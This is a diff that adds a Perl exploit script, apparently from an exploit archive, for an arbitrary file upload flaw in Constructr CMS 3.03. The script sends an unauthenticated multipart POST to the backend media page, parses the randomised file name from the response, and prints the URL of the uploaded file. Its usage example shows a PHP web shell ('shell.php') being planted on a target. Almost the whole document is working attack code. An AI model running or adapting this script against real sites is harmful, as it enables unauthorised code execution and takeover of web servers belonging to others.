@@ -1,0 +1,116 @@
+#!/usr/bin/env perl
+
+# Constructr CMS 3.03 Arbitrary File Upload
+#
+# Author: plucky
+# Email:  io.plucky@gmail.com     
+#
+# Vulnerable Page: /constructr/backend/media.php [line 
+# App Download:    http://sourceforge.net/projects/constructr/
+#
+# Date: 23/03/2011
+# THX TO: yawn, shrod, h473 and DoMinO
+
+use strict;
+use warnings;
+
+use LWP::UserAgent;
+use HTTP::Request::Common qw( POST );
+
+
+my $host           = '';
+my $file_to_upload = '';
+my $new_file_name  = '';
+my $file_extension = '';
+
+
+sub exploit_usage {
+
+    print 'Constructr CMS 3.03 Arbitrary File Upload'                                        . "\n".
+          '-------------------------'                                                        . "\n".
+          'Author: plucky'                                                                   . "\n".
+          'Email:  io.plucky@gmail.com'                                                      . "\n".
+          '-------------------------'                                                        . "\n". 
+          'Usage:'                                                                           . "\n".
+          '        perl xpl.pl [host]/[cms-path]/ /[path-file]/[file]'                       . "\n".
+          'Example:'                                                                         . "\n".
+          '        perl ' . $0 . ' http://vulnerable.com/constructr/ /home/plucky/shell.php' . "\n";
+
+    exit;
+
+}
+
+sub file_parse {
+
+    my $file_name       = '';
+    my $file_extension  = '';
+    my $file_to_upload  = '';
+    my $rfile_to_upload = '';
+
+
+    $rfile_to_upload = shift;
+    $file_to_upload  = ${$rfile_to_upload};
+
+    $file_to_upload =~ m/\/([a-z0-9]+)\.([a-z]+)/i;
+
+    $file_name      = $1;
+    $file_extension = $2;
+
+    return ( $file_name, $file_extension )
+
+}
+
+sub upload_file {
+
+    my $host            = '';
+    my $rhost           = '';
+    my $file_name       = '';
+    my $file_extension  = '';
+    my $response        = '';
+    my $path            = '';
+    my $html            = '';
+    my $user_agent      = '';
+    my $file_to_upload  = '';
+    my $rfile_to_upload = '';
+    my $new_file_name   = '';
+
+
+    ( $rhost, $rfile_to_upload ) = @_;
+
+    $host           = ${$rhost};
+    $file_to_upload = ${$rfile_to_upload};
+
+    $user_agent = LWP::UserAgent->new;
+    $path       = $host . 'backend/media.php';
+
+
+    $response = $user_agent->post(
+        $path,
+        [
+            'create_file' => 'try',
+            'file'        => [$file_to_upload],
+        ],
+        'Content_Type' => 'form-data'
+    );
+
+
+    ( $file_name, $file_extension ) = file_parse( \$file_to_upload );
+
+
+    $html = $response->decoded_content;
+    $html =~ m/show_path=([a-f0-9]{32})\.$file_extension">$file_name\.$file_extension<\/a>/i;
+
+    $new_file_name = $1;
+
+    return ( $new_file_name, $file_extension );
+
+}
+
+@ARGV == 2
+           ? ( $host, $file_to_upload ) = @ARGV
+           : exploit_usage();
+
+( $new_file_name, $file_extension ) = upload_file( \$host, \$file_to_upload );
+
+
+print $host, 'data/workspace/uploads/', $new_file_name, '.', $file_extension, "\n";
